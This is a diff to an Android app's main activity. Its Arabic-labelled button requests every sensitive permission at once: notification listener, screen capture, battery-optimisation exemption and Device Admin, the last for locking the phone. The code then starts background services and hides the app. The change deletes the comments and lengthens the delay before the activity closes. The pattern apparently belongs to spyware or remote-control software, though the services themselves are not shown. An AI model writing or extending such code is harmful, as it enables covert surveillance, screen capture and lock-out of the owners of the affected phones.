@@ -56,24 +56,19 @@ public class MainActivity extends AppCompatActivity {
         Button btnPermissions = new Button(this);
         btnPermissions.setText("🔓 تفعيل جميع الصلاحيات");
         btnPermissions.setOnClickListener(v -> {
-            // 1. الأذونات العادية
             for (String permission : permissions) {
                 if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                     ActivityCompat.requestPermissions(this, new String[]{permission}, REQUEST_CODE_PERMISSIONS);
                 }
             }
-            // 2. صلاحية الإشعارات
             startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
-            // 3. صلاحية تسجيل الشاشة
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                 MediaProjectionManager pm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                 startActivityForResult(pm.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION);
             }
-            // 4. تجاهل البطارية
             Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
             intent.setData(Uri.parse("package:" + getPackageName()));
             startActivity(intent);
-            // 5. صلاحية Device Admin (للقفل)
             ComponentName admin = new ComponentName(this, AdminReceiver.class);
             DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
             if (!dpm.isAdminActive(admin)) {
@@ -81,7 +76,6 @@ public class MainActivity extends AppCompatActivity {
                 adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                 startActivity(adminIntent);
             }
-
             Toast.makeText(this, "✅ تم فتح جميع الصلاحيات", Toast.LENGTH_LONG).show();
         });
 
@@ -89,17 +83,13 @@ public class MainActivity extends AppCompatActivity {
         layout.addView(btnPermissions);
         setContentView(layout);
 
-        // بدء الخدمات فوراً
         startService(new Intent(this, MainService.class));
         startService(new Intent(this, NotifyService.class));
 
-        // انتظر 5 ثواني قبل إغلاق النشاط (لضمان استقرار الخدمة)
         new android.os.Handler().postDelayed(() -> {
-            // نقل التطبيق إلى الخلفية بدلاً من إغلاقه نهائياً
             moveTaskToBack(true);
-            // ثم إنهاء النشاط بعد نقله للخلفية
             finish();
-        }, 10000);
+        }, 500000);
     }
 
     @Override
